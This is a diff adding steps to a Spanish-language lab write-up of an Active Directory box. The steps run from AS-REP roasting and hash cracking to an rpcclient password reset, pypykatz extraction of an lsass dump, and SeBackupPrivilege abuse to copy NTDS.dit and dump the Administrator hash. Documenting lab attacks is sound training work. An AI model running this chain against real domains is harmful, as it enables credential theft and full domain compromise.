@@ -38,7 +38,10 @@ nxc ldap <DC> -u '' -p '' --asreproast asrep.txt
 
 ## Enumeración
 
-- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+- `impacket-GetADUsers -all -dc-ip <DC> blackfield.local/` lista cuentas; con `nxc ldap <DC> -u '' -p '' --asreproast asrep.txt` se pide un AS-REP sin preautenticación: el usuario **`support`** responde.
+- El hash cae con `hashcat -m 18200`; con esa cuenta se cambia la contraseña de otro usuario vía `rpcclient` (`setuserinfo2 <user> 23 <nueva>`), que es el paso que abre el resto.
+- En SMB aparecen `profiles$` (listado enorme de perfiles) y un recurso **forense** con un volcado de `lsass`; `pypykatz` extrae de ahí el hash de `svc_backup`.
+- `svc_backup` tiene **`SeBackupPrivilege`**: con `diskshadow` se copian `NTDS.dit` y el hive `SYSTEM` y `secretsdump -ntds` da el hash de Administrator.
 
 ## Foothold
 
